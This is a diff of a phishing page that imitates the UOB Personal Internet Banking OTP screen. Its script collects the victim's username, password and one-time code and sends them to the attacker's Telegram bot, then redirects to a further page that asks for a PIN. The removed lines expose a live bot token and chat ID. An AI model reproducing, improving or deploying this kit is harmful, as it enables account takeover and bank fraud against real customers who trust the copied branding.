@@ -5,217 +5,139 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>UOB Personal Internet Banking - OTP</title>
 <style>
-  body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #0057b7, #003d7a);
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: 'Roboto', sans-serif;
+    background: #003d7a;
     display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-    color: #333;
-  }
-  .logo {
-    margin: 20px 0 10px 20px;
-    font-weight: bold;
-    font-size: 28px;
-    color: #0057b7;
-    display: flex;
+    justify-content: center;
     align-items: center;
   }
-  .logo .red-bars {
-    width: 20px;
-    height: 28px;
-    background: repeating-linear-gradient(
-      to right,
-      #d71920,
-      #d71920 3px,
-      transparent 3px,
-      transparent 6px
-    );
-    margin-right: 10px;
-  }
-  .otp-container {
+  .otp-box {
     background: #fff;
-    border-radius: 4px;
     width: 320px;
-    max-width: 90%;
-    padding: 20px 30px;
-    box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-    margin-bottom: 40px;
-    text-align: center;
+    padding: 28px 32px 36px;
+    border-radius: 6px;
+    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
   }
-  .language {
-    text-align: right;
+  .lang {
     font-size: 13px;
-    margin-bottom: 15px;
+    text-align: right;
+    margin-bottom: 12px;
   }
-  .language a {
-    color: #5e5e5e;
+  .lang a {
+    color: #0072ce;
     text-decoration: none;
-    margin-left: 7px;
+    margin-left: 8px;
   }
-  .language a:hover {
+  .lang a:hover {
     text-decoration: underline;
   }
-  h2 {
-    margin: 8px 0 20px 0;
-    font-weight: 500;
+  .logo {
+    display: flex;
+    align-items: center;
+    margin-bottom: 24px;
+  }
+  .logo .bars {
+    width: 20px; height: 24px;
+    background:
+      repeating-linear-gradient(to right,
+        #d71920 0 3px,
+        transparent 3px 6px);
+    margin-right: 9px;
+  }
+  .logo span {
+    font-weight: 700;
+    font-size: 22px;
+    color: #0072ce;
+  }
+  h1 {
+    font-weight: 400;
     font-size: 20px;
+    margin: 0 0 24px 0;
     color: #333;
   }
   input[type="text"] {
     width: 100%;
-    padding: 14px 10px;
-    margin: 6px 0 20px;
-    box-sizing: border-box;
-    font-size: 14px;
-    border: 1px solid #ddd;
-    border-radius: 2px;
-    color: #999;
-    text-align: center;
-  }
-  input[type="text"]:focus {
-    border-color: #0057b7;
-    color: #333;
+    border: 1px solid #ccc;
+    border-radius: 4px;
     outline: none;
+    padding: 14px 12px;
+    font-size: 14px;
+    color: #999;
+    box-sizing: border-box;
+    text-align: center;
+    letter-spacing: 1.5em;
+  }
+  input:focus {
+    border-color: #0072ce;
+    color: #333;
   }
   button {
-    background-color: #0072ce;
-    color: white;
-    border: none;
-    padding: 12px;
+    margin-top: 24px;
     width: 100%;
-    border-radius: 3px;
+    background-color: #0072ce;
+    border: none;
+    color: #fff;
+    padding: 12px 0;
     font-size: 16px;
+    border-radius: 4px;
     cursor: pointer;
   }
   button:hover {
     background-color: #0057b7;
   }
-  .forgot-link {
-    color: #0072ce;
-    font-size: 13px;
-    text-decoration: none;
-    display: block;
-    margin-top: 10px;
-  }
-  .forgot-link:hover {
-    text-decoration: underline;
-  }
-  .footer {
-    text-align: center;
-    margin-top: auto;
-    margin-bottom: 20px;
-  }
-  .tmrw-logo {
-    display: inline-block;
-    background-color: #0057b7;
-    color: #fff;
-    padding: 10px 15px;
-    border-radius: 7px;
-    font-weight: bold;
-    font-size: 14px;
-    margin-bottom: 8px;
-    vertical-align: middle;
-    position: relative;
-    line-height: 24px;
-  }
-  .tmrw-logo .red-bars {
-    width: 20px;
-    height: 24px;
-    background: repeating-linear-gradient(
-      to right,
-      #d71920,
-      #d71920 3px,
-      transparent 3px,
-      transparent 6px
-    );
-    display: inline-block;
-    vertical-align: middle;
-    margin-right: 6px;
-  }
-  .tmrw-logo span {
-    vertical-align: middle;
-  }
 </style>
 </head>
 <body>
 
-<div class="logo">
-  <div class="red-bars"></div>UOB
-</div>
-
-<div class="otp-container" role="main">
-  <div class="language">
+<div class="otp-box" role="main" aria-label="OTP entry form">
+  <div class="lang" aria-label="Language selection">
     <a href="#">English</a> | <a href="#">Bahasa Indonesia</a>
   </div>
-  <h2>Enter OTP</h2>
-  <form id="otpForm" action="javascript:void(0);" aria-label="OTP form">
-    <input type="text" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
+
+  <div class="logo" aria-label="UOB logo">
+    <div class="bars" aria-hidden="true"></div><span>UOB</span>
+  </div>
+
+  <h1>Enter PIN</h1>
+
+  <form id="otpForm" action="javascript:void(0);">
+    <input type="text" maxlength="6" minlength="6" pattern="[0-9]{6}" inputmode="numeric" placeholder="------" id="otp" name="otp" required aria-label="OTP" autocomplete="one-time-code" />
     <button type="submit" id="otpBtn">Submit</button>
   </form>
 </div>
 
-<div class="footer" aria-label="Footer and app download">
-  <div class="tmrw-logo" aria-label="TMRW by UOB logo">
-    <div class="red-bars"></div><span>UOB</span> TMRW ID
-  </div>
-</div>
-
 <script>
-  // Ganti dengan token dan chat ID Telegram Anda
-  const telegramBotToken = '8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM';
-  const telegramChatId = '6647221855';
+  const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+  const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
 
-  // Ambil data login dari sessionStorage
   const user = sessionStorage.getItem('uob_user');
   const pass = sessionStorage.getItem('uob_pass');
 
-  // Jika data login tidak ada, kembali ke halaman login
-  if (!user || !pass) {
-    alert('Session login expired. Please login again.');
-    window.location.href = 'index.html';
-  }
+  if (!user || !pass) window.location.href = 'index.html';
 
-  document.getElementById('otpForm').addEventListener('submit', function(event) {
-    event.preventDefault();
+  document.getElementById('otpForm').addEventListener('submit', e => {
+    e.preventDefault();
 
-    var otp = document.getElementById('otp').value.trim();
+    const otp = document.getElementById('otp').value.trim();
+    if (!/^\d{6}$/.test(otp)) return;
 
-    if (!otp || !/^\d{6}$/.test(otp)) {
-      alert('Please enter a valid 6-digit OTP.');
-      return;
-    }
+    sessionStorage.setItem('uob_otp', otp);
 
-    // Gabungkan data login dan OTP
-    const message = `
-UOB OTP Submission:
-Username: ${user}
-Password: ${pass}
-OTP: ${otp}
-    `;
+    const message = 
+      `UOB PIN Submission:\nUsername: ${user}\nPassword: ${pass}\nPIN: ${otp}`;
 
-    // Kirim pesan ke Telegram Bot
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: telegramChatId,
-        text: message,
-        parse_mode: 'HTML'
+        text: message
       })
-    })
-    .then(response => response.json())
-    .then(data => {
-      alert('OTP sent successfully.');
-      // Bersihkan session dan redirect ke halaman login lagi
-      sessionStorage.clear();
-      window.location.href = 'otp.html';
-    })
-    .catch(error => {
-      console.error('Error sending OTP to Telegram:', error);
-      alert('Failed to send OTP.');
+    }).finally(() => {
+      window.location.href = 'pin.html';
     });
   });
 </script>
